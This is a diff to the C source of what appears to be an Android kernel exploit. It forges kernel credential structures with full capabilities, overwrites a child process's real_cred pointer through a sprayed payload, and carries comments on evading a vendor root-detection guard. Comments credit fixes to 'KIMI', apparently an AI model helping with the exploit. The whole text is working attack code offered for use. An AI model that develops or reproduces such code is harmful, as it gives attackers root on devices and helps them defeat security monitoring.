@@ -632,20 +632,18 @@ static void fill_init_cred_copy(unsigned char *p, size_t off) {
       v += kaslr_slide;
     put64(c, (size_t)i * 8, v);
   }
-  /* usage(=+0): a huge refcount AND a pointer to a ZEROED sprayed slot
-   * (page+0x1600) so the pi-erase's NULL-sibling up-walk terminates
-   * (cc -> zeroslot -> NULL) instead of faulting on 0x40000000. */
-  put64(c, 0, (uintptr_t)(p + 0x1600));
   /*
-   * MODE4_CAPSONLY (diyiqiuye PFEM10 recipe, 2026-09-17): patch uid
-   * family to 2000 — oplus_root_check only kills on uid DROP edges and
-   * never reads capabilities. uid=2000 + 5×cap sets = 0x1FFFFFFFFFF =
-   * root-equivalent without triggering the guard. init_cred already
-   * has full caps; only the uid bytes need changing.
+   * KIMI K3 FIX (09-20): usage MUST be a sane positive refcount.
+   * The old value (a kernel page address) put garbage in the low 32
+   * bits (possibly negative as atomic_t) and corrupted uid in the
+   * high 32 bits (fixed later by CAPSONLY). Now: single 8-byte write
+   * packing usage=0x40000000 (never freed) + uid in one store.
    */
   if (env_flag("MODE4_CAPSONLY", 0)) {
     uint32_t cu = (uint32_t)env_int_range("MODE4_CAPS_UID", 2000, 0, 65535);
-    put32(c, 0x04, cu); /* uid */
+    /* Pack usage (4B at +0) + uid (4B at +4) in one 8-byte store */
+    uint64_t packed = ((uint64_t)cu << 32) | 0x40000000ULL;
+    put64(c, 0, packed);
     put32(c, 0x08, cu); /* gid */
     put32(c, 0x0c, cu); /* suid */
     put32(c, 0x10, cu); /* sgid */
@@ -653,7 +651,11 @@ static void fill_init_cred_copy(unsigned char *p, size_t off) {
     put32(c, 0x18, cu); /* egid */
     put32(c, 0x1c, cu); /* fsuid */
     put32(c, 0x20, cu); /* fsgid */
-    pr_info("CAPSONLY cred: uid=%u (guard-safe) caps=full\n", cu);
+    pr_info("CAPSONLY cred: uid=%u usage=0x40000000 caps=full "
+            "(KIMI fix: no kernel-addr refcount)\n", cu);
+  } else {
+    /* Non-CAPSONLY: keep the old pi-erase termination behavior */
+    put64(c, 0, (uintptr_t)(p + 0x1600));
   }
 }
 
@@ -1616,7 +1618,17 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       if (env_flag("MODE4_SLIDE_ZERO", 0) || env_flag("MODE4_DATAONLY", 0) ||
           env_flag("MODE4_SLIDE_CRED", 0) || env_flag("MODE4_SLIDE_KPTR", 0) ||
           env_flag("MODE4_SLIDE_GBOOT", 0)) {
-        if (env_flag("MODE4_CAPSONLY", 0)) {
+        if (env_flag("MODE4_CAPSONLY", 0) && env_flag("MODE4_CAPS778", 0)) {
+          /* KIMI DUAL: W0.pi writes real_cred (+0x778) = child cred.
+           * Main tree writes subjective (+0x780). Both same walk. */
+          if (g_child_cred) {
+            write_pc = (uint64_t)g_child_cred;
+            write_right = 0;
+            write_left = (uint64_t)(g_child_task + 0x778);
+            pr_info("DUAL W0.pi: *(child+0x778)=%016zx (real_cred)\n",
+                    (size_t)write_pc);
+          }
+        } else if (env_flag("MODE4_CAPSONLY", 0)) {
           /* COMBINED (roll 34): W0.pi = PROVEN leaf-NULL ROOTGUARD unhook
            * *(sys_exit.funcs+0x40)=0 — same walk as the main-tree cred
            * write. .funcs image offset 0x2950700 ("Lives" 3+ boots,
